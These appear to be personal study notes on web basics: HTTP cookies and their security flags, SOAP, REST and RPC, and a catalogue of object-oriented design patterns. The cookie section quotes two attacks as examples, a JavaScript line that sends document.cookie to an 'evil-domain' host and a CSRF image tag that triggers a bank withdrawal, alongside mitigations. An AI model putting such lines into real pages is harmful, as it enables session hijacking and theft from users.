- HTTP cookie (web cookie/browser cookie) is a small piece of data that a server sends to the user's web browser
and browser may store it and send it back with next request to same server
-> typically used to tell if two requests came from the same browser to keep a user logged in; remembers stateful information for stateless HTTP protocol
- mainly used for session management (logins, shopping carts, game scores, anything server should remember)
-> personalization (user preferences, themes, other settings)
-> tracking (recording and analyzing user behavior)
- used to be used for general client-side storage until sessionStorage, localStorage, indexedDB came out
- since cookies are sent with every request, they can worsen performance (especially for mobile data connections)
- when receiving HTTP request, server can send a "Set-Cookie" header with response and this cookie stored by browser and then cookie is sent with requests made
to the same server inside a "Cookie" HTTP header
-> expiration date or duration can be specified and after which cookie is no longer set; can also set restrictions to a specific domain and path
i.e. header from server tells client to store a cookie
Set-Cookie: <cookie-name>=<cookie-value>

HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

// session cookie set
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
- session cookies: deleted when client shuts down because it didn't specify Expires or Max-Age directive though browsers may use session restoring
which makes most session cookies permanent as if browser was never closed
- permanent cookies: expire at a specific date (Expires) or after a specific length of time (Max-Age)
i.e. Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
- secure cookie is only sent to server with an encrypted request over the HTTPS protocol
-> even with Secure, sensitive information should never be stored in cookies as they are Insecure
-> to prevent cross-site scripting (XSS) attacks, HttpOnly cookies are inaccessible to JS's Document.cookie API and are only sent to server
i.e. cookies that persist server-side sessions don't need to be available to JS and HttpOnly Flag should be set
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
- Domain and Path directives define the scope of the cookie: what URLs the cookies should be sent to
-> Domain: specifies allowed hosts to receive the cookie (subdomains included), defaults to host of current document location
-> Path: indicates URL path that must exist in requested URL in order to send the Cookie header i.e. /docs
- SameSite cookies let servers require that a cookie shouldn't be sent with cross-site requests which somewhat prevents against cross-site request forgery attacks
-> not yet supported by all browsers
- new cookies can be created via Document.cookie property and if HttpOnly flag is not set, existing cookies can be accessed from JS as well
-> cookies available to JS can get stolen through XSS
- confidential/sensitive information should never be stored or transmitted in HTTP Cookies as mechanism is insecure
-> cookies often used in web app to identify a user and authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session
i.e. social engineering or exploiting XSS vulnerability but HttpOnly cookie can help mitigate this attack by preventing access to cookie value through JS
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
-> CSRF: say image isn't really an image but a request to steal your information/money
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
-> if logged into account and cookies still valid, will transfer money as soon as you load HTML that contains img
-> can prevent this through input filtering, should always be confirmation required for any sensitive action, cookies for sensitive actions should have a short lifetime only
-> can also verify Same Origin and check CSRF tokens
- cookies have domain associated to them; if same domain as the page you're on, cookies are a first-party cookie and sent only to server setting them; if different, third-party cookie
and third-party cookies for tracking and advertising in third-party components (some add-ons can block them)
-> can set clear disclosures/privacy policies to notify users of cookies
-> Do-Not-Track, zombie/"Evercookies" recreated after deletion and are intentionally hard to delete forever

SOAP:
  remote procedure call model, defined how to encode procedure call into XML string, really complicated WS* stack

REST API:
REST stands for Representational State Transfer, an architectural style that has largely been adopted as a best practice for building web and mobile applications. 
RESTful services are designed to be lightweight, easy to maintain, and scaleable. 
They are typically based on the HTTP protocol, make explicit use of HTTP methods (GET, POST, PUT, DELETE), are stateless, use intuitive URIs,
and transfer XML/JSON data between the server and the client.

Restful Patterns:
  REST (Representational State Transfer), resource oriented model
  - modeled around large number of Resources which link among each other, each resource will have a URI to make it globally identifiable
  - define small number of "actions" based on HTTP methods i.e. GET (read-only), PUT (update, modify resource with new representation inside HTTP Body), DELETE (remove), HEAD (for metadata of resource),
  POST(create)
  - URI naming convention related to "Factory Resource" and "Resource Instance" that typically have limited life spanning
  ie. http://xyz.com/books and http://xyz.com/books/4545
  "Dependent Resource" created and owned by existing resource during part of its lifecycle
  i.e. http://xyz.com/books/4545/tableofcontent
  - Creating a resource with POST /books, creating resource when URI is unknown to client before its creation
  - Uploading content of book with PUT /books/4545
  - Searching for books with certain author GET /books?author=Ricky
  - Looking up a particular resource GET /books/4545
  - Looking up dependent resource GET /books/4545/tableofcontent
  - Deleting a book DELETE /books/4545


RPC (remote procedure call):
form of inter-process communication, request-response protocol for message passing
i.e. JSON-RPC - JSON encoded message passing and notifications and for multiple calls to be sent to server

High-Level Design Patterns

Creational
  based on the concept of creating an object

  Class
    Factory
      This makes an instance of several derived classes based on interfaced data or events.
  
  Object
    Abstract Factory	
      Creates an instance of several families of classes without detailing concrete classes.
    Builder	
      Separates object construction from its representation, always creates the same type of object.
    Prototype	
      A fully initialized instance used for copying or cloning.
    Singleton	
      A class with only a single instance with global access points.

Structural
  based on idea of building blocks of objects

  Class
    Adapter
      	Match interfaces of different classes therefore classes can work together despite incompatible interfaces.
    
  Object
    Adapter
      Match interfaces of different classes therefore classes can work together despite incompatible interfaces.
    Bridge
      Separates an object's interface from its implementation so the two can vary independently.
    Composite
      A structure of simple and composite objects which makes the total object more than just the sum of its parts.
    Decorator
      Dynamically add alternate processing to objects.
    Facade
      A single class that hides the complexity of an entire subsystem.
    Flyweight
      A fine-grained instance used for efficient sharing of information that is contained elsewhere.
    Proxy
      A place holder object representing the true object.

Behavioral
  based on way objects play and work together

  Class
    Interpreter	
      A way to include language elements in an application to match the grammar of the intended language.
    Template Method	
      Creates the shell of an algorithm in a method, then defer the exact steps to a subclass.
  
  Object
    Chain of Responsibility	
      A way of passing a request between a chain of objects to find the object that can handle the request.
    Command	
      Encapsulate a command request as an object to enable, logging and/or queuing of requests, and provides error-handling for unhandled requests.
    Iterator
      Sequentially access the elements of a collection without knowing the inner workings of the collection.
    Mediator
      Defines simplified communication between classes to prevent a group of classes from referring explicitly to each other.
    Memento	
      Capture an object's internal state to be able to restore it later.
    Observer	
      A way of notifying change to a number of classes to ensure consistency between the classes.
    State	
      Alter an object's behavior when its state changes.
    Strategy	
      Encapsulates an algorithm inside a class separating the selection from the implementation.
    Visitor	
      Adds a new operation to a class without changing the class.
